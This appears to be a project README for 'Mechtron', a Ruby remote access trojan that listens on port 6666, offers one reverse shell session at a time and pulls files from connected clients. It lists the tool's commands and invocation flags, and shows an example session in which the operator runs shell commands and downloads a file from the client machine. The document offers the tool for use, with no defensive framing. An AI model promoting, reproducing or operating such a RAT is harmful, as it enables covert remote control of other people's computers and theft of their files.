# Mechtron
A RAT tool. Mechtron runs on port 6666. It can handle multiple clients, but one session at a time. Meaning you can have one reverse shell instance at a time. I plan on publishing a debian package, but for now you'll have to deal with the source folders.

## Commands
clients<br>
session IP<br>
get IP FILE_PATH<br>
commands<br>

## Instructions
***Client -*** ```./mechtron.rb -c IP```<br>
***Server -*** ```./mechtron.rb -s```<br>
***Help -*** ```./mechtron.rb -h```

## Example Usage

### Server
```
chmod +x mechtron.rb
./mechtron -s
starting server on port 6666
127.0.0.1 joined
session 127.0.0.1
session started with 127.0.0.1
$ whoami
chrisbasinger
$ which ruby
/bin/ruby
$ exit
closing session
get 127.0.0.1 /home/chrisbasinger/dos.sh
Starting download
download finished
exit
exiting the server..

Process finished with exit code 0

```

### Client
```
chmod +x rat.rb
sudo ./mechtron -c 127.0.0.1
```
